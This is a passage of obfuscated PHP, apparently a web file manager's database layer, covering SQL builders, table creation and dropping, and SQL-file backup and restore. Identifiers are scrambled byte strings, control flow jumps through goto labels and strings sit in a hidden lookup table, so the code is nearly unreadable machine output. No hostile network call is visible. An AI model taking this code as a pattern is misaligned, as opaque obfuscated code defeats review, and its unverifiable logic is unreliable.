‘‹Çè£: foreach ($AÍŞÙ÷§‚… as $a–‡Õğ®­ã => $F¹óäğ©Êä) { if (is_array($F¹óäğ©Êä) && $D„ÙÎ’ùÛ[294] == $F¹óäğ©Êä[0]) { $fàùöÉéë[] = $this->parseKey($a–‡Õğ®­ã); $c³ä²ÉÓÌ[] = $F¹óäğ©Êä[1]; } elseif (is_scalar($F¹óäğ©Êä) || is_null($F¹óäğ©Êä)) { $fàùöÉéë[] = $this->parseKey($a–‡Õğ®­ã); $c³ä²ÉÓÌ[] = $this->parseValue($F¹óäğ©Êä); } } $fÂÔ†×ƒ”² = ($eğ›³ÂéË‹ ? $D„ÙÎ’ùÛ[866] : $D„ÙÎ’ùÛ[867]) . $D„ÙÎ’ùÛ[868] . $this->parseTable($Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[276]]) . $D„ÙÎ’ùÛ[862] . implode($D„ÙÎ’ùÛ[47], $fàùöÉéë) . $D„ÙÎ’ùÛ[863] . implode($D„ÙÎ’ùÛ[47], $c³ä²ÉÓÌ) . $D„ÙÎ’ùÛ[864]; $fÂÔ†×ƒ”² .= $this->parseLock(isset($Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[820]]) ? $Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[820]] : !1); goto d¿Ÿà££¥ù; d¿Ÿà££¥ù: $fÂÔ†×ƒ”² .= $this->parseComment(!empty($Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[351]]) ? $Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[351]] : $D„ÙÎ’ùÛ[33]); return $this->execute($fÂÔ†×ƒ”², $this->parseBind(!empty($Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[282]]) ? $Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[282]] : array())); goto fÆòõ£µ†ã; EÓòŒÙŠ²ª: $D„ÙÎ’ùÛ =& $_SERVER[¬ı§†‰ú˜¼]; $c³ä²ÉÓÌ = $fàùöÉéë = array(); $this->model = $Cğ´¼Ú‹´“[$D„ÙÎ’ùÛ[278]]; goto B ‘‹Çè£; fÆòõ£µ†ã: } public function selectInsert($fÍá‘ÔÈ´², $aíŠéŠÚİÚ, $e’ç‹é®‰¾ = array()) { goto DöØá›ÊÇù; bË†……‚èô: array_walk($fÍá‘ÔÈ´², array($this, $aóİ•µ·[865])); $fƒ„ËÇ‚ÛÙ = $aóİ•µ·[996] . $this->parseTable($aíŠéŠÚİÚ) . $aóİ•µ·[862] . implode($aóİ•µ·[47], $fÍá‘ÔÈ´²) . $aóİ•µ·[974]; $fƒ„ËÇ‚ÛÙ .= $this->buildSelectSql($e’ç‹é®‰¾); goto Bïä•Âé‡; Bïä•Âé‡: return $this->execute($fƒ„ËÇ‚ÛÙ, $this->parseBind(!empty($e’ç‹é®‰¾[$aóİ•µ·[282]]) ? $e’ç‹é®‰¾[$aóİ•µ·[282]] : array())); goto d‹Çä´·Ú„; DöØá›ÊÇù: $aóİ•µ· =& $_SERVER[¬ı§†‰ú˜¼]; $this->model = $e’ç‹é®‰¾[$aóİ•µ·[278]]; if (is_string($fÍá‘ÔÈ´²)) { $fÍá‘ÔÈ´² = explode($aóİ•µ·[47], $fÍá‘ÔÈ´²); } goto bË†……‚èô; d‹Çä´·Ú„: } public function update($aÂ˜¤ßƒé·, $fÁ›Ùïâ¢) { $FâĞªÅÇÈİ =& $_SERVER[¬ı§†‰ú˜¼]; $this->model = $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[278]]; $BÚâÖ‰ƒĞË = $FâĞªÅÇÈİ[997] . $this->parseTable($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[276]]) . $this->parseSet($aÂ˜¤ßƒé·) . $this->parseWhere(!empty($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[272]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[272]] : $FâĞªÅÇÈİ[33]) . $this->parseOrder(!empty($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[362]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[362]] : $FâĞªÅÇÈİ[33]) . $this->parseLimit(!empty($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[289]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[289]] : $FâĞªÅÇÈİ[33]) . $this->parseLock(isset($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[820]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[820]] : !1) . $this->parseComment(!empty($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[351]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[351]] : $FâĞªÅÇÈİ[33]); return $this->execute($BÚâÖ‰ƒĞË, $this->parseBind(!empty($fÁ›Ùïâ¢[$FâĞªÅÇÈİ[282]]) ? $fÁ›Ùïâ¢[$FâĞªÅÇÈİ[282]] : array())); } public function delete($cëñº¼œÉî = array()) { $fë¼§ä§é =& $_SERVER[¬ı§†‰ú˜¼]; $this->model = $cëñº¼œÉî[$fë¼§ä§é[278]]; $b…êÀ°Ä³ = $fë¼§ä§é[998] . $this->parseTable($cëñº¼œÉî[$fë¼§ä§é[276]]) . $this->parseWhere(!empty($cëñº¼œÉî[$fë¼§ä§é[272]]) ? $cëñº¼œÉî[$fë¼§ä§é[272]] : $fë¼§ä§é[33]) . $this->parseOrder(!empty($cëñº¼œÉî[$fë¼§ä§é[362]]) ? $cëñº¼œÉî[$fë¼§ä§é[362]] : $fë¼§ä§é[33]) . $this->parseLimit(!empty($cëñº¼œÉî[$fë¼§ä§é[289]]) ? $cëñº¼œÉî[$fë¼§ä§é[289]] : $fë¼§ä§é[33]) . $this->parseLock(isset($cëñº¼œÉî[$fë¼§ä§é[820]]) ? $cëñº¼œÉî[$fë¼§ä§é[820]] : !1) . $this->parseComment(!empty($cëñº¼œÉî[$fë¼§ä§é[351]]) ? $cëñº¼œÉî[$fë¼§ä§é[351]] : $fë¼§ä§é[33]); return $this->execute($b…êÀ°Ä³, $this->parseBind(!empty($cëñº¼œÉî[$fë¼§ä§é[282]]) ? $cëñº¼œÉî[$fë¼§ä§é[282]] : array())); } public function select($f¼ØùäÆÔ = array()) { goto cççß¤é÷; cççß¤é÷: $B‚ Ë¸’„­ =& $_SERVER[¬ı§†‰ú˜¼]; $this->model = $f¼ØùäÆÔ[$B‚ Ë¸’„­[278]]; $FÇ„••íŠ = $this->buildSelectSql($f¼ØùäÆÔ); goto e›ì„©Üô; EÆå‘§ŒªÊ: if ($Dî‹È÷‹ÉÆ && !1 !== $e¶ê’Ï•°Û) { think_cache($F©â¡×ç³¦, $e¶ê’Ï•°Û, $Dî‹È÷‹ÉÆ); } return $e¶ê’Ï•°Û; goto cÌ“—”°ƒ; e›ì„©Üô: $Dî‹È÷‹ÉÆ = isset($f¼ØùäÆÔ[$B‚ Ë¸’„­[346]]) ? $f¼ØùäÆÔ[$B‚ Ë¸’„­[346]] : !1; if ($Dî‹È÷‹ÉÆ) { $F©â¡×ç³¦ = is_string($Dî‹È÷‹ÉÆ[$B‚ Ë¸’„­[93]]) ? $Dî‹È÷‹ÉÆ[$B‚ Ë¸’„­[93]] : $B‚ Ë¸’„­[999] . md5($FÇ„••íŠ); $Cå´Ğ×Ë² = think_cache($F©â¡×ç³¦, $B‚ Ë¸’„­[33], $Dî‹È÷‹ÉÆ); if (!1 !== $Cå´Ğ×Ë²) { return $Cå´Ğ×Ë²; } } $e¶ê’Ï•°Û = $this->query($FÇ„••íŠ, $this->parseBind(!empty($f¼ØùäÆÔ[$B‚ Ë¸’„­[282]]) ? $f¼ØùäÆÔ[$B‚ Ë¸’„­[282]] : array())); goto EÆå‘§ŒªÊ; cÌ“—”°ƒ: } public function buildSelectSql($e¸¢ù™õ´ = array()) { goto a¡¨ÕáÔ™; C®ù‡Ñà‡º: return $dÃ¿Ùªö˜¼; goto B‘Ú…ÏŠ‘°; FÒÀÒé…: $dÃ¿Ùªö˜¼ = $this->parseSql($this->selectSql, $e¸¢ù™õ´); $dÃ¿Ùªö˜¼ .= $this->parseLock(isset($e¸¢ù™õ´[$dÙ•À…İ‰[820]]) ? $e¸¢ù™õ´[$dÙ•À…İ‰[820]] : !1); if (isset($DÂŸÆ‹®˜ã)) { think_cache($DÂŸÆ‹®˜ã, $dÃ¿Ùªö˜¼); } goto C®ù‡Ñà‡º; a¡¨ÕáÔ™: $dÙ•À…İ‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($e¸¢ù™õ´[$dÙ•À…İ‰[350]])) { if (strpos($e¸¢ù™õ´[$dÙ•À…İ‰[350]], $dÙ•À…İ‰[47])) { list($AÄÓ˜¾Ëöâ, $EÆ¡«ùäÜ) = explode($dÙ•À…İ‰[47], $e¸¢ù™õ´[$dÙ•À…İ‰[350]]); } else { $AÄÓ˜¾Ëöâ = $e¸¢ù™õ´[$dÙ•À…İ‰[350]]; } $AÄÓ˜¾Ëöâ = $AÄÓ˜¾Ëöâ ? $AÄÓ˜¾Ëöâ : 1; $EÆ¡«ùäÜ = isset($EÆ¡«ùäÜ) ? $EÆ¡«ùäÜ : (is_numeric($e¸¢ù™õ´[$dÙ•À…İ‰[289]]) ? $e¸¢ù™õ´[$dÙ•À…İ‰[289]] : 20); $E¼œ†Ë¸¹ = $EÆ¡«ùäÜ * ((int) $AÄÓ˜¾Ëöâ - 1); $e¸¢ù™õ´[$dÙ•À…İ‰[289]] = $E¼œ†Ë¸¹ . $dÙ•À…İ‰[47] . $EÆ¡«ùäÜ; } if (think_config($dÙ•À…İ‰[1000])) { $DÂŸÆ‹®˜ã = $dÙ•À…İ‰[1001] . md5(serialize($e¸¢ù™õ´)); $bÃ·Ù¿¾îŠ = think_cache($DÂŸÆ‹®˜ã); if ($bÃ·Ù¿¾îŠ) { return $bÃ·Ù¿¾îŠ; } } goto FÒÀÒé…; B‘Ú…ÏŠ‘°: } public function parseSql($E»ğ»šç·Ë, $F¯÷ßõ²¾… = array()) { $d‰‚öÜêåİ =& $_SERVER[¬ı§†‰ú˜¼]; $E»ğ»šç·Ë = str_replace(array($d‰‚öÜêåİ[1002], $d‰‚öÜêåİ[1003], $d‰‚öÜêåİ[1004], $d‰‚öÜêåİ[1005], $d‰‚öÜêåİ[1006], $d‰‚öÜêåİ[1007], $d‰‚öÜêåİ[1008], $d‰‚öÜêåİ[1009], $d‰‚öÜêåİ[1010], $d‰‚öÜêåİ[1011], $d‰‚öÜêåİ[1012]), array($this->parseTable("{$F¯÷ßõ²¾…[$d‰‚öÜêåİ[276]]}"), $this->parseDistinct(isset($F¯÷ßõ²¾…[$d‰‚öÜêåİ[1013]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[1013]] : !1), $this->parseField(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[270]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[270]] : $d‰‚öÜêåİ[182]), $this->parseJoin(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[279]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[279]] : $d‰‚öÜêåİ[33]), $this->parseWhere(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[272]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[272]] : $d‰‚öÜêåİ[33]), $this->parseGroup(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[1014]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[1014]] : $d‰‚öÜêåİ[33]), $this->parseHaving(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[1015]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[1015]] : $d‰‚öÜêåİ[33]), $this->parseOrder(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[362]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[362]] : $d‰‚öÜêåİ[33]), $this->parseLimit(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[289]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[289]] : $d‰‚öÜêåİ[33]), $this->parseUnion(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[344]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[344]] : $d‰‚öÜêåİ[33]), $this->parseComment(!empty($F¯÷ßõ²¾…[$d‰‚öÜêåİ[351]]) ? $F¯÷ßõ²¾…[$d‰‚öÜêåİ[351]] : $d‰‚öÜêåİ[33])), $E»ğ»šç·Ë); return $E»ğ»šç·Ë; } public function getLastSql($c‚âØ¿ß¶Ö = '') { return $c‚âØ¿ß¶Ö ? $this->modelSql[$c‚âØ¿ß¶Ö] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Fˆœ‡’Îäª) { return addslashes($Fˆœ‡’Îäª); } public function setModel($f§ÏÌº‘ˆ) { $this->model = $f§ÏÌº‘ˆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto D„çÂÍˆÂ; D„çÂÍˆÂ: class DbManage { function __construct($EøÙêßÄ¬Ç, $c°å¿…ÇÈÅ = '') { $this->database = $EøÙêßÄ¬Ç; $this->type = $c°å¿…ÇÈÅ; } public function model($aˆ¢ªì¼¦Õ = '') { return new ModelBase($aˆ¢ªì¼¦Õ, $_SERVER[¬ı§†‰ú˜¼][33], $this->database); } public function db($dâ‰‹Ê†“ = false) { goto DŞòë‚¨Îò; CÍÄî×ÏÁ©: $this->database = $aô¤ŠºŠ‰ö; $Bå‘¾§×ô† = $this->model()->db(); try { $C©¼“ÛöÎ = $Bå‘¾§×ô†->execute("\163\150\157\167\40\144\x61\x74\141\142\x61\x73\145\x73\40\x6c\x69\153\x65\40\x27{$C¥ô­¥Ä…ñ}\47"); } catch (Exception $dÒÑŠ…¹âª) { } goto bÇ­“é›ˆ; A·ŠĞƒ‡Ù¶: $this->database = $aô¤ŠºŠ‰ö; $Bå‘¾§×ô†->execute("\165\163\145\40\140{$C¥ô­¥Ä…ñ}\x60"); return $Bå‘¾§×ô†; goto D¦ñš„£³™; DŞòë‚¨Îò: $bÌŠ¼»³ =& $_SERVER[¬ı§†‰ú˜¼]; $aô¤ŠºŠ‰ö = array_change_key_case($this->database); if ($this->type == $bÌŠ¼»³[9] || !$dâ‰‹Ê†“) { return $this->model()->db(); } goto E¬‘Ã²Î‡˜; bÇ­“é›ˆ: if (!$C©¼“ÛöÎ) { $Bå‘¾§×ô†->execute("\x63\162\145\x61\164\145\40\x64\141\x74\x61\x62\141\163\x65\x20\x60{$C¥ô­¥Ä…ñ}\140"); } $aô¤ŠºŠ‰ö[$bÌŠ¼»³[928]] = $C¥ô­¥Ä…ñ; if ($aô¤ŠºŠ‰ö[$bÌŠ¼»³[755]] == $bÌŠ¼»³[756]) { $aô¤ŠºŠ‰ö[$bÌŠ¼»³[757]] .= $bÌŠ¼»³[1016] . $C¥ô­¥Ä…ñ; } goto A·ŠĞƒ‡Ù¶; E¬‘Ã²Î‡˜: $C¥ô­¥Ä…ñ = $aô¤ŠºŠ‰ö[$bÌŠ¼»³[928]]; $aô¤ŠºŠ‰ö[$bÌŠ¼»³[928]] = $bÌŠ¼»³[33]; if ($aô¤ŠºŠ‰ö[$bÌŠ¼»³[755]] == $bÌŠ¼»³[756]) { $d½†Ö†‘¾Ú = $aô¤ŠºŠ‰ö[$bÌŠ¼»³[757]]; $aô¤ŠºŠ‰ö[$bÌŠ¼»³[757]] = substr($d½†Ö†‘¾Ú, 0, strrpos($d½†Ö†‘¾Ú, $bÌŠ¼»³[1016])); } goto CÍÄî×ÏÁ©; D¦ñš„£³™: } public function createTable($e™ÈÌÌ–¨¾, $b®è£ìèå = null) { $fá‚å±† =& $_SERVER[¬ı§†‰ú˜¼]; if (!IO::exist($e™ÈÌÌ–¨¾)) { ActionCall($fá‚å±†[1017], !0, 0); show_json(LNG($fá‚å±†[1018]), !1); } $b³œ¯¤ƒ†ò = sqlSplit(IO::getContent($e™ÈÌÌ–¨¾)); foreach ($b³œ¯¤ƒ†ò as $a¾Á°ÕÉí) { if ($b®è£ìèå) { $dï­›¤µõ• = stripos($a¾Á°ÕÉí, $fá‚å±†[1019]) === 0; if ($dï­›¤µõ•) { $b®è£ìèå->task[$fá‚å±†[1020]] += 1; } } $this->model()->db()->execute($a¾Á°ÕÉí); if ($b®è£ìèå && $dï­›¤µõ•) { preg_match($fá‚å±†[1021], $a¾Á°ÕÉí, $bÁèÈÁ¹õ); $b®è£ìèå->task[$fá‚å±†[1022]] = $bÁèÈÁ¹õ[1]; $b®è£ìèå->update(1); } } $this->taskToCache($b®è£ìèå); } public function insertTable($Eâ®¡×Ûíö, $cÊñê‹—¹å = null) { $cŸÙ¨ÚˆÂÊ =& $_SERVER[¬ı§†‰ú˜¼]; $c·°øÃ„™¼ = $this->model()->db(); $cÇ•º¦™‡ó = $A¤ù÷¶ÔáÃ ? array($A¤ù÷¶ÔáÃ) : $c·°øÃ„™¼->getTables(); foreach ($Eâ®¡×Ûíö as $BïêœˆÖÀ¯) { $A¤ù÷¶ÔáÃ = basename($BïêœˆÖÀ¯, $cŸÙ¨ÚˆÂÊ[747]); if (!in_array($A¤ù÷¶ÔáÃ, $cÇ•º¦™‡ó)) { continue; } if ($cÊñê‹—¹å) { $cÊñê‹—¹å->task[$cŸÙ¨ÚˆÂÊ[1022]] = $A¤ù÷¶ÔáÃ; } if (get_filesize($BïêœˆÖÀ¯) == 0) { continue; } $AµĞçÉÒ = $this->sqlToDb($BïêœˆÖÀ¯, $cÊñê‹—¹å); if (!$AµĞçÉÒ) { ActionCall($cŸÙ¨ÚˆÂÊ[1017], !0, 0); show_json(LNG($cŸÙ¨ÚˆÂÊ[1023]) . "\x5b{$A¤ù÷¶ÔáÃ}\x5d", !1); } } $this->taskToCache($cÊñê‹—¹å); } public function sqlFromDb($D³™ëºô«ë, $AØ¹Øòíó, $aÌèÊêÍÎ = null, $DÎâ˜—©“à = null) { goto fáŠîç¹Ï×; fÉˆ³ù´‘†: $dÈ©Ü·ÀŞµ = 0; $f‡ƒÆŸÃŠ = 10000; $EšèÙ„²É = fopen($AØ¹Øòíó, $_SERVER[¬ı§†‰ú˜¼][1024]); goto f¬ÁÍµ¬¦‚; fáŠîç¹Ï×: if ($aÌèÊêÍÎ) { $aÌèÊêÍÎ->task[$_SERVER[¬ı§†‰ú˜¼][1022]] = $D³™ëºô«ë; } $b„ˆ…Ò¹‚Ú = $this->model($D³™ëºô«ë); $f‹µ„¡ÔÙ´ = 0; goto fÉˆ³ù´‘†; E’²³¬ïææ: fclose($EšèÙ„²É); return $f‹µ„¡ÔÙ´; goto EÓ×²Ü»ß; f¬ÁÍµ¬¦‚: $d‰òîÆåÆ» = $b„ˆ…Ò¹‚Ú->getPk(); $E¿ƒƒ’À˜ = $b„ˆ…Ò¹‚Ú->getDbFields(); do { $f¹“„É¢¦Ì = array($d‰òîÆåÆ» => array($_SERVER[¬ı§†‰ú˜¼][970], $dÈ©Ü·ÀŞµ)); $Fà¸Àô®Á = $b„ˆ…Ò¹‚Ú->where($f¹“„É¢¦Ì)->field($E¿ƒƒ’À˜)->order($d‰òîÆåÆ» . $_SERVER[¬ı§†‰ú˜¼][1025])->limit($f‡ƒÆŸÃŠ)->select(); $Fà¸Àô®Á = !empty($Fà¸Àô®Á) ? $Fà¸Àô®Á : array(); if (!($Dø§Õ½†ì = count($Fà¸Àô®Á))) { break; } $b«–¦£é¢Ï = end($Fà¸Àô®Á); $dÈ©Ü·ÀŞµ = $b«–¦£é¢Ï[$d‰òîÆåÆ»]; $B…ÆÌµÙÛÔ = array(); foreach ($Fà¸Àô®Á as $B˜¾‘¯…İÁ) { if ($D³™ëºô«ë == $_SERVER[¬ı§†‰ú˜¼][1026] && $B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][29]] == $_SERVER[¬ı§†‰ú˜¼][1027]) { $d•¾Š¥Ñ = json_decode($B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][371]], !0); if ($d•¾Š¥Ñ[$_SERVER[¬ı§†‰ú˜¼][28]] == date($_SERVER[¬ı§†‰ú˜¼][715]) && !$d•¾Š¥Ñ[$_SERVER[¬ı§†‰ú˜¼][714]]) { continue; } } if ($DÎâ˜—©“à) { $B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][76]] = "\x7b\151\x6f\72{$DÎâ˜—©“à}\175" . substr($B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][76]], strlen("\x7b\x69\x6f\x3a{$B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][790]]}\x7d")); $B˜¾‘¯…İÁ[$_SERVER[¬ı§†‰ú˜¼][790]] = $DÎâ˜—©“à; } $B…ÆÌµÙÛÔ[] = $_SERVER[¬ı§†‰ú˜¼][1028] . $this->sqlEncode($B˜¾‘¯…İÁ) . $_SERVER[¬ı§†‰ú˜¼][1029]; } $f¹âèôÊ¯ = "\111\116\x53\x45\x52\x54\40\x49\116\124\x4f\40\x60{$D³™ëºô«ë}\140\40\x28\x60" . implode($_SERVER[¬ı§†‰ú˜¼][1030], $E¿ƒƒ’À˜) . $_SERVER[¬ı§†‰ú˜¼][1031]; fwrite($EšèÙ„²É, $f¹âèôÊ¯ . implode($_SERVER[¬ı§†‰ú˜¼][1032], $B…ÆÌµÙÛÔ) . $_SERVER[¬ı§†‰ú˜¼][68] . PHP_EOL); $f‹µ„¡ÔÙ´ += $Dø§Õ½†ì; if ($aÌèÊêÍÎ) { $aÌèÊêÍÎ->update($Dø§Õ½†ì); } } while ($f‡ƒÆŸÃŠ == $Dø§Õ½†ì); goto E’²³¬ïææ; EÓ×²Ü»ß: } public function sqlToDb($fãï”†Ÿ¦é, $EéÍ¨Çƒ¥ = null) { goto b”ğ›àÖª; d÷ïíî¼¥³: if (!empty($FøÑä²Ë¦)) { $f—ŠÔ‘èš« = $aÓ¬Ãİíø . implode($cŞÅº¨Ø•[47], $FøÑä²Ë¦); if (!$EÀğîÌÁ¾->execute($f—ŠÔ‘èš«)) { return !1; } if ($EéÍ¨Çƒ¥) { $EéÍ¨Çƒ¥->update($AŒ÷•§Ú); } } return !0; goto FÕ¦±„‚¤; b”ğ›àÖª: $cŞÅº¨Ø• =& $_SERVER[¬ı§†‰ú˜¼]; $EÀğîÌÁ¾ = $this->model()->db(); $Eé¦—²§Š³ = @fopen($fãï”†Ÿ¦é, $cŞÅº¨Ø•[1033]); goto B¥œğÎë‹; B‘“«¾â¤: $FøÑä²Ë¦ = array(); $a‡Ïö¯ ß‹ = $this->type == $cŞÅº¨Ø•[9] ? 500 : 2000; $cíÖóš¡¥‘ = basename($fãï”†Ÿ¦é, $cŞÅº¨Ø•[747]); goto A³óì“É•Ø; B¥œğÎë‹: if (!$Eé¦—²§Š³) { return !1; } $AŒ÷•§Ú = 0; $aÓ¬Ãİíø = $cŞÅº¨Ø•[33]; goto B‘“«¾â¤; A³óì“É•Ø: if ($cíÖóš¡¥‘ == $cŞÅº¨Ø•[1034]) { $a‡Ïö¯ ß‹ = 50; } while (!feof($Eé¦—²§Š³)) { $b®ÀÇĞÎë = trim(fgets($Eé¦—²§Š³)); if (!$b®ÀÇĞÎë) { continue; } $f—ŠÔ‘èš« = $this->sqlDecode($b®ÀÇĞÎë, $this->type); if (stripos($f—ŠÔ‘èš«, $cŞÅº¨Ø•[354]) === 0) { if (!$aÓ¬Ãİíø) { $aÓ¬Ãİíø = $f—ŠÔ‘èš« . $cŞÅº¨Ø•[50]; } continue; } if ($EéÍ¨Çƒ¥) { $EéÍ¨Çƒ¥->task[$cŞÅº¨Ø•[1020]] += 1; } $AŒ÷•§Ú++; $FøÑä²Ë¦[] = rtrim(rtrim(trim($f—ŠÔ‘èš«), $cŞÅº¨Ø•[47]), $cŞÅº¨Ø•[68]); if ($AŒ÷•§Ú >= $a‡Ïö¯ ß‹) { $f—ŠÔ‘èš« = $aÓ¬Ãİíø . implode($cŞÅº¨Ø•[47], $FøÑä²Ë¦); if (!$EÀğîÌÁ¾->execute($f—ŠÔ‘èš«)) { return !1; } if ($EéÍ¨Çƒ¥) { $EéÍ¨Çƒ¥->update($AŒ÷•§Ú); } $FøÑä²Ë¦ = array(); $AŒ÷•§Ú = 0; } } fclose($Eé¦—²§Š³); goto d÷ïíî¼¥³; FÕ¦±„‚¤: } public function dropTable($b‹áÅÅªÊŠ = null) { $DÇ”êÒÎè¼ = $this->model()->db(); $e±â¢š¦ïš = $b‹áÅÅªÊŠ ? array($b‹áÅÅªÊŠ) : $DÇ”êÒÎè¼->getTables(); if (!$e±â¢š¦ïš) { return; } foreach ($e±â¢š¦ïš as $b‹áÅÅªÊŠ) { $DÇ”êÒÎè¼->execute("\x64\162\157\x70\40\x74\141\x62\154\145\x20\x69\146\40\x65\170\151\163\x74\x73\x20\140{$b‹áÅÅªÊŠ}\x60"); } } private function taskToCache($B¡ª‡ïÎİÑ = null) { $EøÜ¥¨Úä¯ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$B¡ª‡ïÎİÑ) { return; } $ešæ±ø‹£¹ = array($EøÜ¥¨Úä¯[1022] => $B¡ª‡ïÎİÑ->task[$EøÜ¥¨Úä¯[1022]], $EøÜ¥¨Úä¯[1020] => $B¡ª‡ïÎİÑ->task[$EøÜ¥¨Úä¯[1020]], $EøÜ¥¨Úä¯[1035] => $B¡ª‡ïÎİÑ->task[$EøÜ¥¨Úä¯[1035]]); if ($ešæ±ø‹£¹[$EøÜ¥¨Úä¯[1020]] == $ešæ±ø‹£¹[$EøÜ¥¨Úä¯[1035]]) { $ešæ±ø‹£¹[$EøÜ¥¨Úä¯[721]] = 1; } Cache::set($EøÜ¥¨Úä¯[1036] . $B¡ª‡ïÎİÑ->task[$EøÜ¥¨Úä¯[392]], $ešæ±ø‹£¹); $B¡ª‡ïÎİÑ->end(); } private function sqlEncode($e¢ Œ‚Â›) { $dÚ§•öêŸé =& $_SERVER[¬ı§†‰ú˜¼]; $E¹°ô—ó’À = array(); foreach ($e¢ Œ‚Â› as $C…šéÀ¼Ş¤) { if (is_array($C…šéÀ¼Ş¤)) { $C…šéÀ¼Ş¤ = json_encode_force($C…šéÀ¼Ş¤); } $C…šéÀ¼Ş¤ = addslashes($C…šéÀ¼Ş¤); $C…šéÀ¼Ş¤ = str_replace(array($dÚ§•öêŸé[1037], $dÚ§•öêŸé[228]), array($dÚ§•öêŸé[1038], $dÚ§•öêŸé[1039]), $C…šéÀ¼Ş¤); $E¹°ô—ó’À[] = str_replace($dÚ§•öêŸé[55], $dÚ§•öêŸé[1040], $C…šéÀ¼Ş¤); } return $dÚ§•öêŸé[55] . implode($dÚ§•öêŸé[1041], $E¹°ô—ó’À) . $dÚ§•öêŸé[55]; } private function sqlDecode($d‹èïãØÎŞ, $C¸”ŞàÑ›†) { $d³±¨Ş×ãµ =& $_SERVER[¬ı§†‰ú˜¼]; $d‹èïãØÎŞ = str_replace(array($d³±¨Ş×ãµ[1038], $d³±¨Ş×ãµ[1039]), array($d³±¨Ş×ãµ[1037], $d³±¨Ş×ãµ[228]), $d‹èïãØÎŞ); if ($C¸”ŞàÑ›† == $d³±¨Ş×ãµ[9]) { $d‹èïãØÎŞ = stripslashes($d‹èïãØÎŞ); } return $d‹èïãØÎŞ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($dÅöäÄîŞ, $D¬Ù¬ƒ»¢Š) { goto aÇã°œ„É¯; fŠ¦Ç§Ä®ì: Hook::trigger($b¾®êÆ”‹¯[1043] . $dÅöäÄîŞ . $b¾®êÆ”‹¯[1046], $bß­¤’Âí, $a½‡’¸çç‰); return $a½‡’¸çç‰; goto cø½ƒà®‘Ø; aÇã°œ„É¯: $b¾®êÆ”‹¯ =& $_SERVER[¬ı§†‰ú˜¼]; $bß­¤’Âí = $D¬Ù¬ƒ»¢Š; $GLOBALS[$b¾®êÆ”‹¯[1042]] = $b¾®êÆ”‹¯[1043] . $dÅöäÄîŞ; goto bŠƒ¶§ìŒÑ; bŠƒ¶§ìŒÑ: Hook::trigger($b¾®êÆ”‹¯[1043] . $dÅöäÄîŞ . $b¾®êÆ”‹¯[1044], $bß­¤’Âí); $a«‰ˆÒÈ” = self::driverMake($D¬Ù¬ƒ»¢Š[0]); if (method_exists($a«‰ˆÒÈ”, $dÅöäÄîŞ)) { $a½‡’¸çç‰ = @call_user_func_array(array($a«‰ˆÒÈ”, $dÅöäÄîŞ), $D¬Ù¬ƒ»¢Š); } else { if (method_exists($a«‰ˆÒÈ”, $b¾®êÆ”‹¯[1045])) { $a½‡’¸çç‰ = @call_user_func_array(array($a«‰ˆÒÈ”, $dÅöäÄîŞ), $D¬Ù¬ƒ»¢Š); } else { if (method_exists(self, $dÅöäÄîŞ)) { $a½‡’¸çç‰ = @call_user_func_array(array(self, $dÅöäÄîŞ), $D¬Ù¬ƒ»¢Š); } else { $a½‡’¸çç‰ = call_user_func_array(array(parent, $dÅöäÄîŞ), $D¬Ù¬ƒ»¢Š); } } } goto fŠ¦Ç§Ä®ì; cø½ƒà®‘Ø: } public static function init($B‚®êù×‡) { return self::driverMake($B‚®êù×‡); } public static function copy($BÜéÃÍµ, $C ¨³¦¼“¯, $AŸ¤ÏÓ–æ¢ = false, $c‹Ôá—‹Ì = false) { return self::copyMoveStart($BÜéÃÍµ, $C ¨³¦¼“¯, $AŸ¤ÏÓ–æ¢, $_SERVER[¬ı§†‰ú˜¼][517], $c‹Ôá—‹Ì); } public static function move($cÕñ„˜›’…, $B›³•ÚÉš„, $Cù¬÷ß®Ì = false, 